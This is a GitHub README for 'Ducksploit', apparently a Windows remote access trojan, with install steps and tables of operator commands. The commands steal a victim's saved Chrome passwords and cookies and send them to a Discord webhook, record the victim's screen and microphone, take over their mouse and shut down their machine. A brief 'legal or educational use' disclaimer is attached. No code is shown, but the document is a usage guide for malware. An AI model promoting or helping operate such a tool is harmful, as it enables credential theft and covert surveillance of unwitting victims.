[![banner](https://github.com/canarddu38/DUCKSPLOIT/blob/root/images/banner.png?raw=true "banner")](https://github.com/canarddu38/DUCKSPLOIT/blob/master/images/banner.png?raw=true "banner")

 # Ducksploit
 ![](https://img.shields.io/badge/Version-1.0-red) ![](https://img.shields.io/github/stars/canarddu38/DUCKSPLOIT) ![](https://img.shields.io/github/issues/canarddu38/DUCKSPLOIT) ![](	https://img.shields.io/github/forks/canarddu38/DUCKSPLOIT) ![](https://img.shields.io/github/license/canarddu38/DUCKSPLOIT)


## Install Ducksploit

   1. Download https://github.com/canarddu38/DUCKSPLOIT/archive/master.zip
   2. Extract downloaded zip file
   3. If python is not installed, launch 'installpython.bat' or download at https://www.python.org/ftp/python/3.8.0/python-3.8.0.exe
   4. Install python requirements using 'installrequirements.bat' script
   5. launch setup.bat       ###MUST BE RUN AS ADMINISTRATOR###
   6. Ducksploit is now installed on your PC :smile:
   7. Type 'ducksploit' in the cmd
   8. Config your ip using 'ipconfig' (your ip)
   9. Wait victim's connection using 'wait' command
   10. Have fun with ducksploit hacking commands (type help to get commands list)


:warning: Ducksploit is made for legal use or educational use :warning:

## Uninstall Ducksploit

   1. Launch Ducksploit terminal using 'ducksploit'
   2. type 'uninstall'
   3. Done  :smile:


## **Commands**

#### Config
| Command  | Usage | Result |
| ------------- | ------------- | ------------- |
| ipconfig  | ipconfig (your ipv4) | config your ip |

#### Exploits
| Command  | Usage | Result |
| ------------- | ------------- | ------------- |
| stealpwds | stealpwds (discord webhook url) | steal all saved chrome passwords of your victim and send them into a discord webhook |
| stealcookies  | stealcookies (discord webhook url) | steal all saved chrome cookies of your victim and send them into a discord webhook |
| open  | open (applicationname.exe) | open mensioned application |
| recordscreen  | recordscreen (time in second) | record victim's screen durring amount of time |
| recordmicro  | recordmicro (time in second) | record victim's micro durring amount of time |
| open  | open (applicationname.exe) | open mensioned application |

#### Mouse
| Command  | Usage | Result |
| ------------- | ------------- | ------------- |
| mouseclick | mouseclick [left, right, middle] | make the victim click the mensionned button |
| mousemove | mousemove (x) (y) | move the victim's cursor by x and y pixels |
| mousescroll | mousescroll (int between -1000 and 1000) | make the user scroll by int pixels |
| locatemouse | locatemouse | get the victim's cursor current locations |

#### Alert Window
| Command  | Usage | Result |
| ------------- | ------------- | ------------- |
| msg | msg [-file, -text] (title) (line1) (line2) | create an alertbox and send it on the vitim's pc with a title and 2 lines (if -file set line1 to createfile command content) |
| createfile | createfile (text) | set the content of line1 of msg command |

#### Mysc
| Command  | Usage | Result |
| ------------- | ------------- | ------------- |
| update | update | update ducksploit |
| exit | exit | exit from the ducksploit treminal |
| help | help | getting the list of all commands |
| shutdown | shutdown | make the victim's pc shutdown |
| reboot | reboot | make the victim's pc reboot |
| closesession | closesesion | make the victim's session close |
